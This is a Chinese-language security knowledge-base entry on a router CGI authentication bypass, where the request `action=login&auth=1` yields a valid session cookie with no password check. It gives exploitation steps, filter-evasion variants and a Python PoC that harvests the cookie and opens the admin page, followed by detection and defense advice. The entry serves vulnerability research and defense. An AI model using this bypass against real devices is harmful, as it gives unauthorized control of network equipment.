---
id: web-generic-auth-cgi-login-auth-param-session-bypass
title: CGI 登录分支仅凭 action=login&auth=1 直接创建 session
type: scenario
domain: web
path: web/generic/auth
technique: cgi-auth-param-session-bypass
aliases:
- CGI 认证绕过
- auth=1 绕过登录
- 路由器登录绕过
- session 伪造
- action=login 免密
tags:
- web
- auth-bypass
- session
- cgi
- router
- iot
- cookie
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:39:05+08:00'
  notes: 已对照原文与5图核对：handle_action 对 haystack 做 strstr(action=login)+strstr(auth=1) 即 srand(time^pid) 建会话并写 ./tmp/sessions/<id>，302+Set-Cookie 与 PoC 一致；图片显示带 Cookie 访问 control.html 返回 200。原文未给产品版本，未设 affected_versions。frontmatter无sources/source_url。
---

## 一句话结论

路由器 CGI 管理端在处理 `?action=login&auth=1` 时，只要查询串里同时出现 `action=login` 与 `auth=1` 就生成 `normaluser` 会话并下发 `session_id` Cookie，完全跳过账号口令校验；攻击者一个 GET 请求即可拿到有效会话，访问受保护的管理页面。

## 原理

- 典型实现：`handle_action` 用 `strstr(haystack, "action=login")` 与 `strstr(haystack, "auth=1")` 做子串判断，两个条件同时成立就直接 `srand(time(0) ^ getpid())` 生成随机 session id，写 `./tmp/sessions/<id>` 文件（内容固定为 `normaluser`），并返回 `Set-Cookie: session_id=...` 与 302 跳转。
- 真正的口令校验位于另一个 CGI（如 `login.cgi`：读取 POST 的 `username/password`，比对 `normaluser` 与硬编码口令）；但 `http` 服务器的路由允许直接请求 `/www/http?action=login&auth=1`，走的是上面的免密分支，根本不经过 `login.cgi`。
- 由于鉴权只依赖 `session_id` Cookie 对应的会话文件，任何拿到该 Cookie 的请求都会被当作 `normaluser`；会话文件由服务器写入，攻击者无需知道口令。
- 子串匹配还带来参数污染空间：`action=login` 与 `auth=1` 可以出现在任意位置（如 `x=action=login&y=auth=1`），只要 `strstr` 命中即可；如果过滤只检查参数名，容易绕过。
- 该模式常见于自研 CGI/路由器 Web：把“创建会话”和“验证凭据”拆成两个分支，却把前者暴露在未认证路由上。

## 触发条件

- 目标 Web 服务器把查询串原样传给 CGI/处理函数；
- 存在一个未认证即可到达的登录分支，且仅以参数存在性/子串匹配作为放行条件；
- 会话只由 `session_id` Cookie 标识，服务端按会话文件判断身份；
- 受保护页面只校验会话存在，不校验来源或二次凭据。

## 利用步骤

1. 直接请求 `GET /www/http?action=login&auth=1`，不要跟随跳转。
2. 从响应头读取 `Set-Cookie: session_id=<id>`，提取 id。
3. 带上 `Cookie: session_id=<id>` 访问 `/control.html` 等受保护页面，确认返回 200。
4. 用该会话调用需要认证的 CGI（如 `vpn.cgi`、`wifi.cgi`、`list.cgi`），继续后续利用或管理操作。
5. 若参数被过滤，尝试把 `action=login`/`auth=1` 放到其他参数值、大小写变体、重复参数或 URL 编码中，观察 `strstr` 是否仍命中。

## PoC

```python
import requests

BASE = "http://127.0.0.1:8080"
r = requests.get(BASE + "/www/http?action=login&auth=1", allow_redirects=False, timeout=5)
print(r.status_code, dict(r.headers))

sid = r.headers["Set-Cookie"].split("session_id=")[1].split(";")[0]
cookies = {"session_id": sid}
r2 = requests.get(BASE + "/control.html", cookies=cookies, allow_redirects=False, timeout=5)
print(r2.status_code, r2.text[:100])
```

响应示例：`302`，`Set-Cookie: session_id=<32 位 hex>; Path=/; HttpOnly`，`Location: /control.html`；带 Cookie 访问管理页返回 200。

## 变体与关联

- 变体：`auth=1` 换成 `isAdmin=1`、`debug=1`、`from=local` 等“信任标记”，只要服务端以参数存在性判断身份即可绕过。
- 变体：会话 id 由 `srand(time ^ pid)` + `rand()` 生成，随机性弱；若能预测时间/pid，可伪造他人会话（需进一步验证）。
- 变体：会话文件权限/路径可写时，可结合路径穿越或任意文件写直接创建会话。
- 关联：Cookie/会话固定、认证绕过、CGI 参数解析、路由器管理端漏洞。
- 边界：若网关在登录分支前强制校验凭据、或会话 token 使用签名且服务端校验，则本手法不成立。

## 检测与防御

- 防御：登录分支必须先在服务端校验凭据；不要把“创建会话”放在未认证可达的分支里。
- 防御：参数判断使用精确的键值解析（如解析 `action=login` 为键值对），不要用 `strstr` 子串匹配；对重复参数、编码变体做规范化。
- 防御：会话 token 使用加密安全随机数并签名，设置 `HttpOnly`、`Secure`、`SameSite`；会话建立后绑定来源/UA 或二次校验。
- 检测：审计 CGI 中“仅凭参数存在即创建 session/设置身份”的分支；监控未认证请求直接访问管理页、异常 `session_id` 生成频率。
- 检测：对 `action=login&auth=1` 这类可疑组合、以及短时间内大量会话创建做告警。
